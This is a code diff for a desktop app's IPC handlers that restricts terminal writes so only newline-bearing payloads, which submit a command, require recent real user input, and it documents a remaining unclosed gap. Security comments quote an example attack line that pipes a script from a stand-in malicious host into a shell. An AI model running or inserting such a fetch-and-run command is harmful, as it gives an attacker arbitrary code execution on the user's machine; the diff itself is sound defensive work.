@@ -269,11 +269,12 @@ type ChannelSpec =
   | (ChannelSpecBase & {
       kind: 'send'
       /**
-       * Requires the user to have recently driven this renderer with real OS
-       * input. For channels whose legitimate caller is a person operating a
-       * widget, where a background script must not be able to call at will.
+       * Requires recent real OS input before a payload that would SUBMIT a
+       * command line (one containing a newline) is forwarded. Payload-scoped
+       * rather than channel-scoped because the same channel also carries
+       * terminal replies the PTY solicits, which arrive with no user input.
        */
-      needsDeliberateInput?: boolean
+      submitNeedsDeliberateInput?: boolean
       handler: (...args: unknown[]) => void
     })
 
@@ -326,6 +327,17 @@ function localFilesystemRequestNeedsToolAuthorization(request: unknown): boolean
  */
 function senderHasUserGesture(event: IpcMainEvent | IpcMainInvokeEvent): boolean {
   return hasRecentDiscreteInput(event.sender)
+}
+
+/**
+ * Whether a terminal-write payload would submit what is in the line buffer.
+ *
+ * `\r` is what a shell treats as "run this"; `\n` is accepted too so a
+ * multi-line or bracketed-paste payload cannot slip a submission through on the
+ * other newline form.
+ */
+function submitsCommandLine(args: unknown[]): boolean {
+  return args.some((arg) => typeof arg === 'string' && (arg.includes('\r') || arg.includes('\n')))
 }
 
 interface DesktopToolAuthorization {
@@ -929,21 +941,33 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       kind: 'send',
       gate: 'app-origin',
       requires: 'terminal',
-      // A raw PTY write submits a command line on the trailing `\r`, so this is
-      // the one channel where the app origin alone is not enough: an XSS'd or
-      // hostile origin would otherwise reach arbitrary command execution with
-      // `write(id, 'curl evil.sh|sh\r')`. `terminal:execute-tool` is bound to a
-      // server-authorized Copilot tool call; this is the interactive path, whose
-      // only legitimate caller is a person typing into xterm.js — so it is gated
-      // on the main process having seen that person's keystrokes. Panel focus is
-      // deliberately not used: `terminal:focused` is a renderer-asserted claim
-      // the same attacker can set.
-      needsDeliberateInput: true,
       handler: (terminalId, data) => {
-        if (typeof terminalId === 'string' && typeof data === 'string') {
-          deps.terminal.write(terminalId, data)
-        }
+        if (typeof terminalId !== 'string' || typeof data !== 'string') return
+        deps.terminal.write(terminalId, data)
       },
+      // Only a submit is gated, never the whole channel.
+      //
+      // This carries xterm.js's entire upstream stream, and much of it is not
+      // typing at all: the PTY solicits replies the terminal must answer
+      // unprompted — DSR cursor position (`CSI 6n`, which p10k/starship emit on
+      // every prompt), device attributes, focus reports (mode 1004, set by both
+      // tmux and vim), mouse reports. Requiring recent input for those would
+      // silently break the reply protocol and leave a program waiting forever
+      // for an answer it will never get.
+      //
+      // A raw write only becomes command execution on the trailing `\r`, so that
+      // is what needs a person behind it: an XSS'd or hostile origin must not
+      // reach `write(id, 'curl evil.sh|sh\r')`. Panel focus is deliberately not
+      // used — `terminal:focused` is a renderer-asserted claim the same attacker
+      // can set.
+      //
+      // MITIGATION, NOT CLOSURE. Text without a newline still reaches the shell's
+      // line buffer, where the user's own next Enter submits it — visible on
+      // screen, but not prevented. Closing that needs the interactive path off
+      // the renderer surface entirely (main writing the keystrokes it already
+      // observes) or the terminal in its own WebContents, neither of which is a
+      // gate change. Tracked as follow-up.
+      submitNeedsDeliberateInput: true,
     },
     'terminal:resize': {
       kind: 'send',
@@ -1061,7 +1085,13 @@ export function registerIpcHandlers(deps: IpcDeps): void {
     } else {
       ipcMain.on(channel, (event, ...args) => {
         if (!senderAllowed(event, spec.gate) || !featureAllowed(spec.requires)) return
-        if (spec.needsDeliberateInput && !hasRecentDeliberateInput(event.sender)) return
+        if (
+          spec.submitNeedsDeliberateInput &&
+          submitsCommandLine(args) &&
+          !hasRecentDeliberateInput(event.sender)
+        ) {
+          return
+        }
         spec.handler(...(spec.passSender ? [event.sender, ...args] : args))
       })
     }
